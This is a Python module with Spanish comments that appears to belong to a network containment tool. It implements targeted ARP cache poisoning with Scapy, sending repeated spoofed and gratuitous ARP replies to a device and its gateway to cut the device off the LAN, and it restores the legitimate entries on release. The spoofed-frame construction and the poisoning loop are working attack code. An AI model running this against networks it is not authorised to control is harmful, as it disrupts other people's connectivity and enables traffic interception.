"""Envenenamiento de caché ARP dirigido a «agujero negro» (ARP spoofing).

Mecanismo de contención de Capa 2 para AISLAR un dispositivo de la red local sin
controlar el router ni el conmutador. Para la MAC objetivo se envía, de forma
periódica y con la MAC/IP propias del adaptador como origen (suplantación,
``ARP`` opcode 2, respuesta no solicitada):

1. Al OBJETIVO: «la IP del gateway está en MI MAC». El objetivo reescribe su
   tabla ARP y envía su tráfico al gateway hacia este equipo (que NO lo reenvía).
2. Al GATEWAY: «la IP del objetivo está en MI MAC». El gateway reescribe su tabla
   ARP y envía hacia este equipo el tráfico destinado al objetivo.

Resultado: el objetivo queda «en un agujero negro» (pierde conectividad con la
red). Se aplican ARP gratuito (``ARP`` opcode 2 también hacia el objetivo con la
IP del gateway, para acelerar el envenenamiento) y se reenvía el par de tramas
cada ``INTERVALO_ENVIO_S`` segundos para mantener las entradas envenenadas.

ADVERTENCIA (esto es lo que el informe del motor advertía): el envenenamiento ARP
es una técnica de ATAQUE, disruptiva y de fiabilidad parcial. Desde otro equipo
del segmento se puede restaurar la tabla ARP con un ARP legítimo; un punto de
acceso con protección anti-spoofing (DHCP snooping / Dynamic ARP Inspection) lo
bloquea. Un objetivo que obtenga conectividad por otra ruta (otra interfaz, otro
segmento o IPv6) no queda contenido. Solo debe usarse en un laboratorio
autorizado.

RESTAURACIÓN: al liberar una MAC se dejan de enviar tramas y se **restauran**
las tablas ARP afectadas enviando las entradas LEGÍTIMAS (la MAC real del
objetivo y la MAC real del gateway, obtenidas por resolución ARP), primero al
objetivo y al gateway, y luego a la difusión para reasentar la caché del
segmento. Es una restauración «en el mejor esfuerzo»: requiere acceso a los
pares reales; si no se pueden resolver, no se puede garantizar y ``status()``
seguirá devolviendo ``DESCONOCIDO`` para esa MAC.

La transmisión de cada trama se delega en ``emisor`` (``_enviar_scapy`` por
defecto), de modo que el núcleo es verificable en las pruebas con un doble.

Requiere Npcap y privilegios de administrador (igual que el resto del backend de
Scapy del proyecto).
"""

from __future__ import annotations

import ipaddress
import logging
import platform
import threading
import time
from collections.abc import Callable
from dataclasses import dataclass

from app.models.mac import normalizar_mac
from infrastructure.interfaces import (EstadoContencion, INetworkIsolation,
                                       OperacionNoEjecutadaError)

_log = logging.getLogger(__name__)

# La MAC de difusión nunca es un objetivo válido.
MAC_DIFUSION = "FF:FF:FF:FF:FF:FF"

# Los móviles y muchos SO reafirman su caché ARP en cuanto reciben tráfico
# legítimo del gateway, por lo que el envenenamiento debe repetirse con bastante
# frecuencia para mantenerse (más corto = más fiable, pero más tráfico).
INTERVALO_ENVIO_S = 0.5
# Tiempo acotado de una operación (contrato INetworkIsolation: ≤ 30 s).
TIMEOUT_OPERACION_S = 30.0
# El hilo de envenenamiento espera la cancelación en pasos para terminarla pronto.
PASO_CANCELACION_S = 0.25

# Emisor inyectable para las pruebas. Firma:
#   (trama_bytes, iface) -> None  (lanza excepción si no se pudo transmitir).
Emisor = Callable[[bytes, object], None]

# Resolutor inyectable: (ip, iface) -> MAC real o None (resolución ARP legítima).
ResolutorArp = Callable[[str, object], "str | None"]


class ErrorEntornoAislamiento(OperacionNoEjecutadaError):
    """El equipo no puede ejecutar el envenenamiento ARP (falta un requisito).

    Hereda de ``OperacionNoEjecutadaError``: el motor GARANTIZA que no tocó la
    red, así que ``IsolationService`` lo registra como fallo CONOCIDO (FAILED),
    nunca como resultado incierto.
    """


@dataclass(frozen=True)
class DatosRed:
    """Parámetros de la interfaz necesarios para el envenenamiento."""

    ip_interfaz: str
    mac_interfaz: str
    ip_gateway: str


def ip_del_gateway(ip_interfaz: str, prefijo: int, puerta_enlace: str | None) -> str | None:
    """Gateway explícito o, si falta, la primera IP utilizable de la subred."""
    if puerta_enlace:
        return puerta_enlace
    try:
        red = ipaddress.ip_network(f"{ip_interfaz}/{prefijo}", strict=False)
    except ValueError:
        return None
    for host in red.hosts():
        return str(host)
    return None


def _resolver_mac(ip_objetivo: str, iface: object) -> str | None:
    """Resolución ARP legítima (``who-has``) de la MAC real de una IP."""
    from scapy.all import ARP, Ether, srp1

    trama = (Ether(dst=MAC_DIFUSION) / ARP(op=1, pdst=ip_objetivo))
    respuesta = srp1(trama, iface=iface, timeout=2.0, verbose=0)
    if respuesta is not None and respuesta.haslayer(ARP):
        return normalizar_mac(respuesta[ARP].hwsrc)
    return None


def _enviar_scapy(trama: bytes, iface: object) -> None:
    """Transmite una trama ya serializada (Scapy/Npcap). Lanza si falla."""
    from scapy.all import sendp

    sendp(trama, iface=iface, verbose=0)


def _tramas_envenenamiento(datos: DatosRed, mac_obj: str,
                           ip_objetivo: str) -> list[bytes]:
    """Tramas ARP de agujero negro: objetivo por el gateway y gateway por el objetivo.

    Se emiten VARIAS variantes porque los sistemas y las topologías aceptan unas y
    descartan otras:

    1. Al objetivo (unicast): «la IP del gateway está en mi MAC».
    2. Al objetivo (difusión): la misma entrada, que el móvil acepta aunque no
       coincida el destino unicast (clave en Wi-Fi y tras suspenderse el móvil).
    3. Al gateway (unicast y difusión): «la IP del objetivo está en mi MAC», para
       que el gateway no entregue al objetivo el tráfico dirigido a él.
    """
    from scapy.all import ARP, Ether

    gratuita = (Ether(src=datos.mac_interfaz, dst=MAC_DIFUSION)
                / ARP(op=2, hwsrc=datos.mac_interfaz, psrc=datos.ip_gateway,
                      hwdst=MAC_DIFUSION, pdst=datos.ip_gateway))
    return [
        # 1) Al OBJETIVO (unicast): «la IP del gateway está en la MAC de este equipo».
        bytes(Ether(src=datos.mac_interfaz, dst=mac_obj)
              / ARP(op=2, hwsrc=datos.mac_interfaz, psrc=datos.ip_gateway,
                    hwdst=mac_obj, pdst=ip_objetivo)),
        # 2) Al OBJETIVO (difusión): misma entrada, forzando su aceptación.
        bytes(Ether(src=datos.mac_interfaz, dst=MAC_DIFUSION)
              / ARP(op=2, hwsrc=datos.mac_interfaz, psrc=datos.ip_gateway,
                    hwdst=MAC_DIFUSION, pdst=ip_objetivo)),
        # 2b) ARP gratuito difundido de la IP del gateway con mi MAC (refuerzo).
        bytes(gratuita),
        # 3) Al GATEWAY (unicast y difusión): «la IP del objetivo está en mi MAC».
        bytes(Ether(src=datos.mac_interfaz, dst=MAC_DIFUSION)
              / ARP(op=2, hwsrc=datos.mac_interfaz, psrc=ip_objetivo,
                    hwdst=MAC_DIFUSION, pdst=datos.ip_gateway)),
    ]


def _tramas_restauracion(datos: DatosRed, mac_obj: str, ip_objetivo: str,
                         mac_gateway_reales: str | None,
                         mac_objetivo_real: str | None) -> list[bytes]:
    """Tramas ARP con las direcciones LEGÍTIMAS para deshacer el envenenamiento."""
    from scapy.all import ARP, Ether

    tramas: list[bytes] = []
    # Devuelve al objetivo la MAC real del gateway.
    if mac_gateway_reales:
        tramas.append(bytes(Ether(src=mac_gateway_reales, dst=mac_obj)
                            / ARP(op=2, hwsrc=mac_gateway_reales, psrc=datos.ip_gateway,
                                  hwdst=mac_obj, pdst=ip_objetivo)))
        tramas.append(bytes(Ether(src=mac_gateway_reales, dst="ff:ff:ff:ff:ff:ff")
                            / ARP(op=2, hwsrc=mac_gateway_reales, psrc=datos.ip_gateway,
                                  hwdst="00:00:00:00:00:00", pdst=ip_objetivo)))
    # Devuelve al gateway la MAC real del objetivo.
    if mac_objetivo_real:
        tramas.append(bytes(Ether(src=mac_objetivo_real, dst=datos.mac_interfaz)
                            / ARP(op=2, hwsrc=mac_objetivo_real, psrc=ip_objetivo,
                                  hwdst=datos.mac_interfaz, pdst=datos.ip_gateway)))
        tramas.append(bytes(Ether(src=mac_objetivo_real, dst="ff:ff:ff:ff:ff:ff")
                            / ARP(op=2, hwsrc=mac_objetivo_real, psrc=ip_objetivo,
                                  hwdst="00:00:00:00:00:00", pdst=datos.ip_gateway)))
    return tramas


class _EnvenenamientoMac:
    """Bucle de envenenamiento de UNA MAC, en su propio hilo demonio."""

    def __init__(self, datos: DatosRed, mac_obj: str, ip_objetivo: str, iface: object,
                 emisor: Emisor, intervalo: float) -> None:
        self.datos = datos
        self.mac_obj = mac_obj
        self.ip_objetivo = ip_objetivo
        self.iface = iface
        self._emisor = emisor
        self._intervalo = intervalo
        self._detener = threading.Event()
        self._hilo = threading.Thread(target=self._correr,
                                      name=f"arp-spoof-{mac_obj[-5:]}", daemon=True)
        self.enviado = False

    def iniciar(self) -> None:
        # Primera ronda SÍNCRONA: el contrato exige que ``status`` justo después
        # de ``isolate`` pueda confirmar la contención, así que se transmiten las
        # tramas iniciales antes de arrancar el bucle de mantenimiento.
        self._enviar_ronda()
        self._hilo.start()

    def detener(self) -> None:
        self._detener.set()

    def unir(self, timeout: float = TIMEOUT_OPERACION_S) -> None:
        self._hilo.join(timeout)

    def vivo(self) -> bool:
        return self._hilo.is_alive()

    def _enviar_ronda(self) -> None:
        for trama in _tramas_envenenamiento(self.datos, self.mac_obj, self.ip_objetivo):
            if self._detener.is_set():
                return
            try:
                self._emisor(trama, self.iface)
                self.enviado = True
            except Exception as error:  # noqa: BLE001 - el envenenamiento puede fallar
                _log.warning("Envenenamiento ARP de %s falló al transmitir: %s",
                             self.mac_obj, error)

    def _correr(self) -> None:
        while not self._detener.is_set():
            self._enviar_ronda()
            self._detener.wait(self._intervalo)


class ArpSpoofingIsolationEngine(INetworkIsolation):
    """Motor de aislamiento por envenenamiento ARP dirigido a agujero negro.

    Implementa ``INetworkIsolation``. Mantiene, por MAC, un hilo de
    envenenamiento; ``status`` informa ``CONTENCION_APLICADA`` solo mientras ese
    hilo está vivo y ha transmitido al menos una trama en esta ejecución.
    """

    def __init__(self, *, proveedor_interfaces=None, emisor: Emisor | None = None,
                 resolutor: ResolutorArp | None = None,
                 intervalo: float = INTERVALO_ENVIO_S) -> None:
        self._emisor = emisor or _enviar_scapy
        self._resolutor = resolutor or _resolver_mac
        self._intervalo = intervalo
        self._proveedor = proveedor_interfaces
        self._envenenamientos: dict[str, _EnvenenamientoMac] = {}
        # MAC sobre las que este motor actuó en ESTA ejecución y luego liberó con
        # restauración verificable: status() puede afirmar SIN_CONTENCION.
        self._liberadas: set[str] = set()
        self._candado = threading.Lock()
        self._datos: DatosRed | None = None
        self._iface: object | None = None
        self._motivo: str | None = None

    # --- Contrato: disponibilidad ---------------------------------------------------

    def disponible(self) -> bool:
        return self._preparar() is not None

    @property
    def motivo_no_disponible(self) -> str:
        if self._motivo is None:
            self._preparar()
        return self._motivo or "El motor ARP no está disponible."

    def _proveedor_interfaces_efectivo(self):
        if self._proveedor is None:
            from infrastructure.network.windows_interfaces import (
                WindowsNetworkInterfaceProvider)
            self._proveedor = WindowsNetworkInterfaceProvider()
        return self._proveedor

    def _preparar(self) -> tuple[DatosRed, object] | None:
        """Resuelve interfaz/adaptador una sola vez. Devuelve None si no puede."""
        if self._datos is not None and self._iface is not None:
            return self._datos, self._iface
        if self._motivo is not None:
            return None
        try:
            from infrastructure.network.diagnostico_motor import (
                capacidad_captura, tiene_privilegios_admin)
        except Exception as error:  # noqa: BLE001
            self._motivo = f"No se pudo comprobar el entorno: {error}"
            return None
        if platform.system() != "Windows":
            self._motivo = "El envenenamiento ARP solo está soportado en Windows."
            return None
        if not tiene_privilegios_admin():
            self._motivo = ("Se requieren privilegios de administrador para el "
                            "envenenamiento ARP (Scapy/Npcap).")
            return None
        captura = capacidad_captura()
        if not captura.backend_disponible:
            self._motivo = f"Backend de captura no disponible: {captura.detalle}"
            return None
        activa = self._interfaz_activa()
        if activa is None or not activa.ipv4 or not activa.mac or activa.prefijo is None:
            self._motivo = ("No hay una interfaz de red conectada con IPv4 para el "
                            "envenenamiento ARP.")
            return None
        gateway = ip_del_gateway(activa.ipv4, activa.prefijo, activa.puerta_enlace)
        if gateway is None:
            self._motivo = "No se pudo determinar la puerta de enlace para el envenenamiento."
            return None
        iface = self._resolver_iface_scapy(activa.ipv4)
        if iface is None:
            self._motivo = (f"Scapy/Npcap no encontró el adaptador con IP {activa.ipv4}.")
            return None
        self._datos = DatosRed(ip_interfaz=activa.ipv4, mac_interfaz=normalizar_mac(activa.mac),
                               ip_gateway=gateway)
        self._iface = iface
        return self._datos, self._iface

    def _interfaz_activa(self):
        try:
            interfaces = self._proveedor_interfaces_efectivo().list_interfaces()
        except Exception as error:  # noqa: BLE001
            self._motivo = f"No se pudieron listar las interfaces: {error}"
            return None
        return next((i for i in interfaces
                     if i.conectada and i.ipv4 and i.mac and i.utilizable), None)

    def _resolver_iface_scapy(self, ip_interfaz: str):
        try:
            import os
            os.environ.setdefault("SCAPY_USE_LIBPCAP", "yes")
            import warnings
            warnings.filterwarnings("ignore")
            from scapy.all import get_working_ifaces
            return next((i for i in get_working_ifaces()
                         if getattr(i, "ip", None) == ip_interfaz), None)
        except Exception as error:  # noqa: BLE001
            self._motivo = f"No se pudo cargar Scapy/Npcap: {error}"
            return None

    # --- Contrato: operaciones ------------------------------------------------------

    def isolate(self, mac: str) -> None:
        mac_obj = normalizar_mac(mac)
        preparado = self._preparar()
        if preparado is None:
            raise ErrorEntornoAislamiento(self.motivo_no_disponible)
        datos, iface = preparado
        with self._candado:
            actual = self._envenenamientos.get(mac_obj)
            if actual is not None and actual.vivo():
                return  # idempotente
        ip_objetivo = self._ip_objetivo(datos, mac_obj)
        if ip_objetivo is None:
            raise ErrorEntornoAislamiento(
                f"No se pudo resolver la dirección IP del objetivo {mac_obj}; "
                "no se inició el envenenamiento.")
        # Alcance L2: si el objetivo no responde a un ARP directo, el punto de
        # acceso probablemente aísla a los clientes entre sí (AP isolation) y el
        # envenenamiento sería inútil. Es una comprobación previa: no se tocó la red.
        alcance = self._resolver_mac_seguro(ip_objetivo)
        if alcance != mac_obj:
            raise ErrorEntornoAislamiento(
                f"El objetivo {mac_obj} ({ip_objetivo}) no respondió a una consulta ARP "
                f"directa (respuesta: {alcance or 'ninguna'}). Es probable que el punto de "
                "acceso aísle a los clientes entre sí o que el objetivo ya no esté en la red; "
                "el envenenamiento ARP no surtiría efecto. No se inició ningún envío.")
        bucle = _EnvenenamientoMac(datos, mac_obj, ip_objetivo, iface,
                                   self._emisor, self._intervalo)
        with self._candado:
            anterior = self._envenenamientos.get(mac_obj)
            if anterior is not None and anterior.vivo():
                return
            self._envenenamientos[mac_obj] = bucle
        bucle.iniciar()
        with self._candado:
            self._liberadas.discard(mac_obj)
        _log.info("Envenenamiento ARP iniciado para %s (IP %s, gateway %s, iface %s).",
                  mac_obj, ip_objetivo, datos.ip_gateway, datos.ip_interfaz)

    def release(self, mac: str) -> None:
        mac_obj = normalizar_mac(mac)
        with self._candado:
            bucle = self._envenenamientos.get(mac_obj)
            if bucle is not None:
                bucle.detener()
        if bucle is not None:
            bucle.unir()  # No se abandona el hilo de envío a medias.
            with self._candado:
                self._envenenamientos.pop(mac_obj, None)
        # Idempotente y RESTAURADOR: aunque no haya un bucle propio, se intenta
        # restaurar las tablas ARP reales (p. ej. de una ejecución anterior).
        restaurado = self._restaurar(mac_obj)
        with self._candado:
            if bucle is not None and restaurado:
                # Este motor aplicó contención a la MAC y la retiró restaurando:
                # puede afirmar que ya no la aplica.
                self._liberadas.add(mac_obj)
            else:
                # Ni había contención propia verificable ni se pudo confirmar la
                # restauración: status seguirá DESCONOCIDO (nunca SIN_CONTENCION
                # por defecto para una MAC que el motor no conoce — contrato H3).
                self._liberadas.discard(mac_obj)
        _log.info("Envenenamiento ARP detenido y tablas ARP restauradas para %s.", mac_obj)

    def status(self, mac: str) -> EstadoContencion:
        mac_obj = normalizar_mac(mac)
        with self._candado:
            bucle = self._envenenamientos.get(mac_obj)
            liberada = mac_obj in self._liberadas
        if bucle is not None and bucle.vivo() and bucle.enviado:
            return EstadoContencion.CONTENCION_APLICADA
        if bucle is None and liberada:
            # Este motor aplicó contención a la MAC y la retiró restaurando: puede
            # afirmar que ya no la aplica.
            return EstadoContencion.SIN_CONTENCION
        # Sin evidencia: nunca SIN_CONTENCION por defecto (contrato H3).
        return EstadoContencion.DESCONOCIDO

    # --- Auxiliares -----------------------------------------------------------------

    def _ip_objetivo(self, datos: DatosRed, mac_obj: str) -> str | None:
        """IP del objetivo: del inventario en memoria o de la tabla ARP local.

        El inventario de dispositivos no se persiste; el monitoreo publica la
        relación MAC → IP en ``inventario_compartido``. Si no está ahí, se
        consulta la tabla de vecinos de Windows (``Get-NetNeighbor``), que el
        barrido ARP del descubrimiento ya rellena.
        """
        try:
            from app.services.inventario_compartido import ip_de_mac
            ip = ip_de_mac(mac_obj)
            if ip:
                return ip
        except Exception:  # noqa: BLE001 - sin inventario disponible
            pass
        return self._ip_desde_tabla_arp(mac_obj)

    def _ip_desde_tabla_arp(self, mac_obj: str) -> str | None:
        try:
            from infrastructure.network.powershell import ejecutar_json
            script = (
                f"$v = @(Get-NetNeighbor -AddressFamily IPv4 -ErrorAction SilentlyContinue | "
                f"Where-Object {{ ([string]$_.LinkLayerAddress).ToUpper() -eq '{mac_obj}' -and "
                "$_.State -ne 'Unreachable' } | "
                "Select-Object @{n='IP';e={[string]$_.IPAddress}}); "
                "ConvertTo-Json -InputObject $v -Compress")
            for registro in ejecutar_json(script, timeout=5.0):
                ip = registro.get("IP")
                if ip:
                    return ip
        except Exception as error:  # noqa: BLE001
            _log.warning("No se pudo consultar la tabla ARP para %s: %s", mac_obj, error)
        return None

    def _restaurar(self, mac_obj: str) -> bool:
        """Envía las entradas ARP legítimas. True si pudo restaurar y confirmarlo."""
        datos = self._datos
        iface = self._iface
        if datos is None or iface is None:
            return False
        ip_objetivo = self._ip_objetivo(datos, mac_obj)
        if ip_objetivo is None:
            _log.warning("No se pudo restaurar %s: IP del objetivo desconocida.", mac_obj)
            return False
        mac_objetivo_real = self._resolver_mac_seguro(ip_objetivo)
        mac_gateway_real = self._resolver_mac_seguro(datos.ip_gateway)
        if mac_objetivo_real is None or mac_gateway_real is None:
            _log.warning("Restauración de %s incompleta: no se resolvieron los pares reales "
                         "(objetivo=%s, gateway=%s).", mac_obj, mac_objetivo_real, mac_gateway_real)
            return False
        tramas = _tramas_restauracion(datos, mac_obj, ip_objetivo,
                                      mac_gateway_real, mac_objetivo_real)
        enviadas = 0
        for trama in tramas:
            for _ in range(3):  # Se reenvía unas veces para reasentar la caché.
                try:
                    self._emisor(trama, iface)
                    enviadas += 1
                except Exception as error:  # noqa: BLE001
                    _log.warning("Restauración ARP de %s: %s", mac_obj, error)
        return enviadas > 0

    def _resolver_mac_seguro(self, ip: str) -> str | None:
        try:
            return self._resolutor(ip, self._iface)
        except Exception as error:  # noqa: BLE001
            _log.warning("Resolución ARP de %s falló: %s", ip, error)
            return None
